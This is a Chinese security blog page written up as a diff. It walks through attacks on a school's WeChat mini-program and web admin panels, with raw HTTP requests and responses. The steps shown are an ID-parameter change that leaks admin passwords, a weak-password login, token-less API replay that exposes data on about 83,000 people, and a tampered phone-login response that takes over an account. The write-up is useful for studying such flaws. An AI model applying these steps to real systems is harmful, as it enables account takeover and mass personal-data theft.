@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>从小程序到web的一次测试 | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="简单描述通过未授权访问，获取弱口令泄露，解密获取管理员权限，接管多个web网站，可对用户进行增删改查，修改密码等操作，并可以删除其他管理员，同时泄露全校8万多人的身份证，学号，工号，手机号，邮箱，家庭住址等五要素信息 打开自己的视野，不要局限于小程序或者web端，有时候收集到后端登录框，也可以查一下看看是否有对应的小程序或者前端，收集思路是差不多的 先从小程序获取到了主域名，还可以绕cdn后用ip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从小程序到web的一次测试">
+<meta property="og:url" content="https://hundredsu.github.io/post/a36a147c.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="简单描述通过未授权访问，获取弱口令泄露，解密获取管理员权限，接管多个web网站，可对用户进行增删改查，修改密码等操作，并可以删除其他管理员，同时泄露全校8万多人的身份证，学号，工号，手机号，邮箱，家庭住址等五要素信息 打开自己的视野，不要局限于小程序或者web端，有时候收集到后端登录框，也可以查一下看看是否有对应的小程序或者前端，收集思路是差不多的 先从小程序获取到了主域名，还可以绕cdn后用ip">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T13:21:19.000Z">
+<meta property="article:modified_time" content="2025-08-07T13:21:43.416Z">
+<meta property="article:author" content="Hundredsu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "从小程序到web的一次测试",
+  "url": "https://hundredsu.github.io/post/a36a147c.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T13:21:19.000Z",
+  "dateModified": "2025-08-07T13:21:43.416Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/a36a147c.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '从小程序到web的一次测试',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">从小程序到web的一次测试</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">从小程序到web的一次测试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T13:21:19.000Z" title="发表于 2025-08-07 21:21:19">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T13:21:43.416Z" title="更新于 2025-08-07 21:21:43">2025-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>通过未授权访问，获取弱口令泄露，解密获取管理员权限，接管多个web网站，可对用户进行增删改查，修改密码等操作，并可以删除其他管理员，同时泄露全校8万多人的身份证，学号，工号，手机号，邮箱，家庭住址等五要素信息</p>
+<p>打开自己的视野，不要局限于小程序或者web端，有时候收集到后端登录框，也可以查一下看看是否有对应的小程序或者前端，收集思路是差不多的</p>
+<p>先从小程序获取到了主域名，还可以绕cdn后用ip进行收集</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/1.png"></p>
+<h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>使用domain:”xxxxxxx.cn”搜索，获取了很多子域名</p>
+<p><a target="_blank" rel="noopener" href="https://wxrkxxxx.xxxxxxx.cn/">https://wxrkxxxx.xxxxxxx.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://bxs.xxxxxxx.cn/">https://bxs.xxxxxxx.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="http://plan.xxxxxxx.cn/">http://plan.xxxxxxx.cn/</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开小程序，抓包拦截</p>
+<p>一个可以回退的登录框</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/2.png"></p>
+<p>然后点击</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/3.png"></p>
+<p>页面跳转，再点击我的</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/4.png"></p>
+<p>将这几个都点一遍，此时一直抓着包不放</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/5.png"></p>
+<p>直到抓到该包</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/6.png"></p>
+<p>POST &#x2F;database&#x2F;getArcticles HTTP&#x2F;1.1</p>
+<p>Host: xxapi.xxxxxx.cn</p>
+<p>Content-Length: 10</p>
+<p>Xweb_xhr: 1</p>
+<p>Authorization: Bearer</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.0.0 Safari&#x2F;537.36 MicroMessenger&#x2F;7.0.20.1781(0x6700143B) NetType&#x2F;WIFI MiniProgramEnv&#x2F;Windows WindowsWechat&#x2F;WMPF WindowsWechat(0x63090b19)XWEB&#x2F;11253</p>
+<p>Content-Type: application&#x2F;json</p>
+<p>Accept: <em>&#x2F;</em></p>
+<p>Sec-Fetch-Site: cross-site</p>
+<p>Sec-Fetch-Mode: cors</p>
+<p>Sec-Fetch-Dest: empty</p>
+<p>Referer: <a target="_blank" rel="noopener" href="https://servi6e1634c98/18/page-frame.html">https://servi6e1634c98/18/page-frame.html</a></p>
+<p>Accept-Encoding: gzip, deflate, br</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Connection: keep-alive</p>
+<p>{“Id”:”1”}</p>
+<p>查看返回包，发现有密码泄露</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/7.png"></p>
+<p>将id改为3后</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/8.png"></p>
+<p>泄露另一个管理员的密码</p>
+<p>拿密文进行解密</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/9.png"></p>
+<p>获得密码，此时由于没有账号密码的登录口所以上fofa，360queke等</p>
+<p>使用domain:”xxxxxx.cn”搜索，获取了很多子域名</p>
+<p><a target="_blank" rel="noopener" href="https://wxrkxxxw.xxxxxx.cn/">https://wxrkxxxw.xxxxxx.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zzxxs.xxxxxx.cn/">https://zzxxs.xxxxxx.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="http://plan.xxxxxx.cn/">http://plan.xxxxxx.cn/</a></p>
+<p>尝试打开发现登录口</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/10.png"></p>
+<p>点击这里，就可以使用账号密码登录</p>
+<p>账号152xxxxxxxx</p>
+<p>密码：123.com</p>
+<p>可以对用户进行增删改查，并且是管理员身份</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/11.png"></p>
+<p>然后就是各种功能的增删改查了，也没什么意思</p>
+<p>此处为重要漏洞处，点击部门管理可以获取大量用户信息</p>
+<p>共有83105条用户的敏感信息泄露</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/12.png"></p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/13.png"></p>
+<p>点击编辑，可以看见用户的信息泄露五要素，此时抓住这个数据包，就可以测越权（普通用户token是否能访问）</p>
+<p>未授权（无token访问），也可以使用xiayue自动测</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/14.png"></p>
+<p>如果是攻防的话，还可以将其他敏感文件一并写入，主要是数量</p>
+<p>同时该系统还有未授权访问的接口泄露，通过构造一样的post包可以进行未授权接口访问，同样可以获取以上所有用户的信息，其他还有大量接口可以进行未授权访问</p>
+<p>此处就仅举出两个泄露较为严重的</p>
+<p><a target="_blank" rel="noopener" href="https://xxapi.xxxxxx.cn/xxxxgetxxxStaff">https://xxapi.xxxxxx.cn/xxxxgetxxxStaff</a></p>
+<p><a target="_blank" rel="noopener" href="https://xxapi.xxxxxx.cn/xxxxxxx/getxxxList">https://xxapi.xxxxxx.cn/xxxxxxx/getxxxList</a></p>
+<p>这是原数据包</p>
+<p>POST &#x2F;org&#x2F;getOrgStaff HTTP&#x2F;1.1</p>
+<p>Host: xxapi.xxxxxx.cn</p>
+<p>Content-Length: 113</p>
+<p>Sec-Ch-Ua: “Chromium”;v&#x3D;”128”, “Not;A&#x3D;Brand”;v&#x3D;”24”, “Google Chrome”;v&#x3D;”128”</p>
+<p>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em></p>
+<p>Sec-Ch-Ua-Platform: “Windows”</p>
+<p>Sec-Ch-Ua-Mobile: ?0</p>
+<p>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTUyODgxODxxxxxxxxxxxxMTQ1NiIsIkZyb20iOiJwY20iLCJVc2VySWQiOjE2LCJJZx.RR-8jkpHRYVFv6OY8u9uN6_WfGPwLyOkFSFck2t62Co</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;128.0.0.0 Safari&#x2F;537.36</p>
+<p>Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
+<p>Origin: <a target="_blank" rel="noopener" href="https://xxxxxxoxw.xxxxxx.cn/">https://xxxxxxoxw.xxxxxx.cn</a></p>
+<p>Sec-Fetch-Site: same-site</p>
+<p>Sec-Fetch-Mode: cors</p>
+<p>Sec-Fetch-Dest: empty</p>
+<p>Referer: <a target="_blank" rel="noopener" href="https://xxxxxfxxw.xxxxxx.cn/">https://xxxxxfxxw.xxxxxx.cn/</a></p>
+<p>Accept-Encoding: gzip, deflate, br</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Priority: u&#x3D;1, i</p>
+<p>Connection: keep-alive</p>
+<p>{“Uploader”:16,”OrgTypeId”:1,”OrgId”:3,”DeptId”:1775,”RoleId”:””,”current”:1,”limit”:12,”name”:null,”Updater”:16}</p>
+<p>这是删除Authorization后的数据包，打开一个新的浏览器，输入网址，抓包然后改成该包</p>
+<p>POST &#x2F;org&#x2F;getOrgStaff HTTP&#x2F;1.1</p>
+<p>Host: xxapi.xxxxxx.cn</p>
+<p>Content-Length: 113</p>
+<p>Sec-Ch-Ua: “Chromium”;v&#x3D;”128”, “Not;A&#x3D;Brand”;v&#x3D;”24”, “Google Chrome”;v&#x3D;”128”</p>
+<p>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em></p>
+<p>Sec-Ch-Ua-Platform: “Windows”</p>
+<p>Sec-Ch-Ua-Mobile: ?0</p>
+<p>Authorization: Bearer </p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;128.0.0.0 Safari&#x2F;537.36</p>
+<p>Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
+<p>Origin: <a target="_blank" rel="noopener" href="https://xxxxxw.xxxxxx.cn/">https://xxxxxw.xxxxxx.cn</a></p>
+<p>Sec-Fetch-Site: same-site</p>
+<p>Sec-Fetch-Mode: cors</p>
+<p>Sec-Fetch-Dest: empty</p>
+<p>Referer: <a target="_blank" rel="noopener" href="https://wxxxxw.xxxxxx.cn/">https://wxxxxw.xxxxxx.cn/</a></p>
+<p>Accept-Encoding: gzip, deflate, br</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Priority: u&#x3D;1, i</p>
+<p>Connection: keep-alive</p>
+<p>{“Uploader”:16,”OrgTypeId”:1,”OrgId”:3,”DeptId”:1775,”RoleId”:””,”current”:1,”limit”:12,”name”:null,”Updater”:16}</p>
+<p>其他链接<a target="_blank" rel="noopener" href="https://bcs.xxxxxx.cn/">https://bcs.xxxxxx.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="http://plan.xxxxxx.cn/#/login?redirect=%2Forg%2Fdept">http://plan.xxxxxx.cn/#/login?redirect=%2Forg%2Fdept</a></p>
+<p>同样使用152xxxxxxxx</p>
+<p>123.com</p>
+<p>成功登录，获取管理员权限</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/15.png"></p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/16.png"></p>
+<p>续写（过了很久又回去看了）</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/17.png"></p>
+<p>以前泄露的管理员账号</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/18.png"></p>
+<p>拦截点击手机号快捷登录，拦截该包返回包</p>
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/19.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /sdk/getPhoneNumber HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxapi.xxxxxxxx.cn</span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">75</span></span><br><span class="line">Authorization: Bearer</span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">132.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span> MicroMessenger/<span class="number">7.0</span>.<span class="number">20.1781</span>(<span class="number">0</span>x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(<span class="number">0</span>x63090a13) UnifiedPCWindowsWechat(<span class="number">0</span>xf254061a) XWEB/<span class="number">16133</span></span><br><span class="line">Xweb_xhr: <span class="number">1</span></span><br><span class="line">Content<span class="literal">-Type</span>: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Sec<span class="literal">-Fetch-Site</span>: cross<span class="literal">-site</span></span><br><span class="line">Sec<span class="literal">-Fetch-Mode</span>: cors</span><br><span class="line">Sec<span class="literal">-Fetch-Dest</span>: empty</span><br><span class="line">Referer: https://sexxxic.com/wxxxxc98/<span class="number">19</span>/page<span class="literal">-frame</span>.html</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Priority: u=<span class="number">1</span>, i</span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;4c53396e1028fbcbf401045axxxxxxxx4f92b9ae86d4b0d48c1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E4%BB%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%88%B0web%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/20.png"></p>
+<p>将此处的包的手机号修改为18313711633</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: nginx/<span class="number">1.22</span>.<span class="number">1</span></span><br><span class="line">Date: Thu, <span class="number">07</span> Aug <span class="number">2025</span> <span class="number">12</span>:<span class="number">22</span>:<span class="number">36</span> GMT</span><br><span class="line">Content<span class="literal">-Type</span>: application/json; charset=utf<span class="literal">-8</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">206</span></span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line">X<span class="literal">-Powered-By</span>: Express</span><br><span class="line">Vary: Origin</span><br><span class="line">Access<span class="literal">-Control-Allow-Credentials</span>: true</span><br><span class="line">Access<span class="literal">-Control-Expose-Headers</span>: Conten<span class="literal">-Type</span>,Authorization,authorization,cookie,Cookie,X<span class="literal">-Requested-With</span></span><br><span class="line">X<span class="literal">-RateLimit-Limit</span>: <span class="number">280</span></span><br><span class="line">X<span class="literal">-RateLimit-Remaining</span>: <span class="number">273</span></span><br><span class="line">X<span class="literal">-RateLimit-Reset</span>: <span class="number">1754570036</span></span><br><span class="line">ETag: W/<span class="string">&quot;ce-fGwtq6SYgx3yH2+hakRG/ubzjpA&quot;</span></span><br><span class="line"><span class="built_in">Set-Cookie</span>: connect.sid=s%<span class="number">3</span>AxxSGHeKT1Cd1HW2<span class="literal">-KGriGDaQ-OZHMbT_</span>.<span class="number">41</span>ukX5o2rLjJALz%<span class="number">2</span>B%<span class="number">2</span>FQ%<span class="number">2</span>FGtomOk5PgdOHLfc8XsW%<span class="number">2</span>B5t5s; Path=/; Expires=Thu, <span class="number">07</span> Aug <span class="number">2025</span> <span class="number">12</span>:<span class="number">42</span>:<span class="number">36</span> GMT; HttpOnly</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">200</span>,<span class="string">&quot;ret&quot;</span>:&#123;<span class="string">&quot;errcode&quot;</span>:<span class="number">0</span>,<span class="string">&quot;errmsg&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="string">&quot;phone_info&quot;</span>:&#123;<span class="string">&quot;phoneNumber&quot;</span>:<span class="string">&quot;18xxxxxxx33&quot;</span>,<span class="string">&quot;purePhoneNumber&quot;</span>:<span class="string">&quot;18xxxxxxx33&quot;</span>,<span class="string">&quot;countryCode&quot;</span>:<span class="string">&quot;86&quot;</span>,<span class="string">&quot;watermark&quot;</span>:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1754569310</span>,<span class="string">&quot;appid&quot;</span>:<span class="string">&quot;wx491104c98&quot;</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>放包直接登录成功</p>
+<p>还是有漏洞啊</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/a36a147c.html">https://hundredsu.github.io/post/a36a147c.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/7aba0c03.html" 